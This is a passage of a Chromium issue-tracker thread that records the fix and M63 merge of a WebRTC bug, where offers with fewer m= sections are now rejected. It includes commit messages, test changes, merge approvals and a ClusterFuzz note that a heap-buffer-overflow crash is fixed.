commit e3dc12451acb5ce3397fdf6506607145c4ee681f
Author: Zhi Huang <zhihuang@chromium.org>
Date: Thu Oct 26 18:59:50 2017

Modified the setRemoteDescription-offer.html

Modifed the setRemoteDescription-offer tests to unblock the CL
(https://webrtc-review.googlesource.com/c/src/+/9621).

The peerconnection should only set the remote offer generated by the CreateOffer
method.

SetLocalDescription is called before creating a subsequent offer.
To support unfied plan SDP, the m= section should be enforced in the subsequent
offer and the offer with different order would be rejected.
For example, if the first offer has "data" and the second offer with "audio, data"
would be rejected.

Based on a Github PR: https://github.com/w3c/web-platform-tests/pull/7893/files

Bug: chromium:773620
Change-Id: Id947c05e795f9fabd60200a20adad02d278218bd
Reviewed-on: https://chromium-review.googlesource.com/736318
Commit-Queue: Zhi Huang <zhihuang@chromium.org>
Reviewed-by: Henrik Boström <hbos@chromium.org>
Cr-Commit-Position: refs/heads/master@{#511902}
[modify] https://crrev.com/e3dc12451acb5ce3397fdf6506607145c4ee681f/third_party/WebKit/LayoutTests/external/wpt/webrtc/RTCPeerConnection-setRemoteDescription-offer-expected.txt
[modify] https://crrev.com/e3dc12451acb5ce3397fdf6506607145c4ee681f/third_party/WebKit/LayoutTests/external/wpt/webrtc/RTCPeerConnection-setRemoteDescription-offer.html


### bu...@chromium.org (2017-10-27)

The following revision refers to this bug:
  https://webrtc.googlesource.com/src.git/+/b2d355ed1f978e0f25c3998a61d79877f622d601

commit b2d355ed1f978e0f25c3998a61d79877f622d601
Author: Zhi Huang <zhihuang@webrtc.org>
Date: Fri Oct 27 01:07:27 2017

Reland: Reject the description with fewer m= sections.

If the subsequent offer contains fewer m= sections than the existing
description, it would be rejected.

The helper method MediaSectionsInSameOrder is modified and it will
compare the number of m= sections before matching the media type.

The original CL: https://webrtc-review.googlesource.com/c/src/+/9621
Reland it after the web-platform-tests are updated:
https://chromium-review.googlesource.com/c/chromium/src/+/736318

TBR=deadbeef@webrtc.org

Bug: chromium:773620
Change-Id: I60e972eb856efc3cef4a18777791053c9f8e0491
Reviewed-on: https://webrtc-review.googlesource.com/16382
Reviewed-by: Zhi Huang <zhihuang@webrtc.org>
Commit-Queue: Zhi Huang <zhihuang@webrtc.org>
Cr-Commit-Position: refs/heads/master@{#20455}
[modify] https://crrev.com/b2d355ed1f978e0f25c3998a61d79877f622d601/pc/peerconnectioninterface_unittest.cc
[modify] https://crrev.com/b2d355ed1f978e0f25c3998a61d79877f622d601/pc/webrtcsession.cc


### cl...@chromium.org (2017-10-27)

ClusterFuzz has detected this issue as fixed in range 508970:508976.

Detailed report: https://clusterfuzz.com/testcase?key=4787889476206592

Job Type: linux_asan_chrome_mp
Crash Type: Heap-buffer-overflow READ 4
Crash Address: 0x60e0000b3b58
Crash State:
  cricket::AudioCodec::Matches
  bool cricket::FindMatchingCodec<cricket::AudioCodec>
  cricket::MediaSessionDescriptionFactory::AddAudioContentForAnswer
  
Sanitizer: address (ASAN)

Recommended Security Severity: Medium

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=498412:498437
Fixed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=508970:508976

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=4787889476206592

See https://github.com/google/clusterfuzz-tools for more information.

If you suspect that the result above is incorrect, try re-doing that job on the test case report page.

### go...@chromium.org (2017-10-28)

 zhihuang@, is there anything pending for M63? 

### zh...@chromium.org (2017-10-30)

Yes,
I would like to merge https://chromium-review.googlesource.com/736318 which is a chromium CL.

After that is landed, https://webrtc-review.googlesource.com/16382 can be merged to WebRTC M63 branch.

### go...@chromium.org (2017-10-30)

+awhalley@, could you ptal https://crbug.com/chromium/773620#c50. Please let me know if Cls look good to merge to M63.

### aw...@chromium.org (2017-10-30)

govind@ - good for M63

### aw...@chromium.org (2017-10-30)

govind@ - good for M63

### go...@chromium.org (2017-10-30)

Approving merge to M63 branch 3239 based on https://crbug.com/chromium/773620#c50 and #52. Please merge ASAP. Thank you.

### bu...@chromium.org (2017-11-01)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/00fd68f1e971510cc7be4cb7a31f0bd1897aa36d

commit 00fd68f1e971510cc7be4cb7a31f0bd1897aa36d
Author: Zhi Huang <zhihuang@chromium.org>
Date: Wed Nov 01 20:28:40 2017

Modified the setRemoteDescription-offer.html

Modifed the setRemoteDescription-offer tests to unblock the CL
(https://webrtc-review.googlesource.com/c/src/+/9621).

Two different peerconnections are used in new tests. The remote offer is
generated by a different peerconnection instead of using the 'generateOffer'
method.

In test 'setRemoteDescription multiple times with diffrerent offer shoud succeed',
setLocalDescription is called before creating a subsequent offer. To support the
unified plan SDP, the order of the m= sections shoud be enforced in subsequent
offer.

Added a new test which sets the same remote offer as remote description multiple
times.

Modified the expected output based on new tests.

Based on a Github PR: https://github.com/w3c/web-platform-tests/pull/7893/files

TBR=zhihuang@chromium.org, hbos@chromium.org

(cherry picked from commit e3dc12451acb5ce3397fdf6506607145c4ee681f)

Bug: chromium:773620
Change-Id: Id947c05e795f9fabd60200a20adad02d278218bd
Reviewed-on: https://chromium-review.googlesource.com/736318
Commit-Queue: Zhi Huang <zhihuang@chromium.org>
Reviewed-by: Henrik Boström <hbos@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#511902}
Reviewed-on: https://chromium-review.googlesource.com/744588
Cr-Commit-Position: refs/branch-heads/3239@{#335}
Cr-Branched-From: adb61db19020ed8ecee5e91b1a0ea4c924ae2988-refs/heads/master@{#508578}
[modify] https://crrev.com/00fd68f1e971510cc7be4cb7a31f0bd1897aa36d/third_party/WebKit/LayoutTests/external/wpt/webrtc/RTCPeerConnection-setRemoteDescription-offer-expected.txt
[modify] https://crrev.com/00fd68f1e971510cc7be4cb7a31f0bd1897aa36d/third_party/WebKit/LayoutTests/external/wpt/webrtc/RTCPeerConnection-setRemoteDescription-offer.html


### zh...@chromium.org (2017-11-01)

Merged the Chromium CL.
I'll wait for another build and make sure it doesn't break anything before merging the WebRTC change.

### bu...@chromium.org (2017-11-02)

The following revision refers to this bug:
  https://webrtc.googlesource.com/src.git/+/b3b6cd16aa86eaacd512ac717f8710583ceb5a44

commit b3b6cd16aa86eaacd512ac717f8710583ceb5a44
Author: Zhi Huang <zhihuang@webrtc.org>
Date: Thu Nov 02 17:51:25 2017

Merge to M63: Reject the description with fewer m= sections.

If the subsequent offer contains fewer m= sections than the existing
description, it would be rejected.

The helper method MediaSectionsInSameOrder is modified and it will
compare the number of m= sections before matching the media type.

The original CL: https://webrtc-review.googlesource.com/c/src/+/9621
Reland it after the web-platform-tests are updated:
https://chromium-review.googlesource.com/c/chromium/src/+/736318

TBR=deadbeef@webrtc.org

(cherry picked from commit b2d355ed1f978e0f25c3998a61d79877f622d601)

Bug: chromium:773620
Change-Id: I60e972eb856efc3cef4a18777791053c9f8e0491
Reviewed-on: https://webrtc-review.googlesource.com/16382
Reviewed-by: Zhi Huang <zhihuang@webrtc.org>
Commit-Queue: Zhi Huang <zhihuang@webrtc.org>
Cr-Original-Commit-Position: refs/heads/master@{#20455}
Reviewed-on: https://webrtc-review.googlesource.com/18262
Cr-Commit-Position: refs/branch-heads/63@{#11}
Cr-Branched-From: bef8a5d2ca5413c680995584b8c0976852ba5f25-refs/heads/master@{#20237}
[modify] https://crrev.com/b3b6cd16aa86eaacd512ac717f8710583ceb5a44/pc/peerconnectioninterface_unittest.cc
[modify] https://crrev.com/b3b6cd16aa86eaacd512ac717f8710583ceb5a44/pc/webrtcsession.cc


### zh...@chromium.org (2017-11-02)

All the changes have been merged.

### aw...@chromium.org (2017-11-03)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-01-20)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2018-03-27)

[Empty comment from Monorail migration]

### is...@google.com (2018-03-27)

This issue was migrated from crbug.com/chromium/773620?no_tracker_redirect=1

[Monorail mergedwith: crbug.com/chromium/775370, crbug.com/chromium/775503, crbug.com/chromium/775730, crbug.com/chromium/775909, crbug.com/chromium/775925]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40089279)*
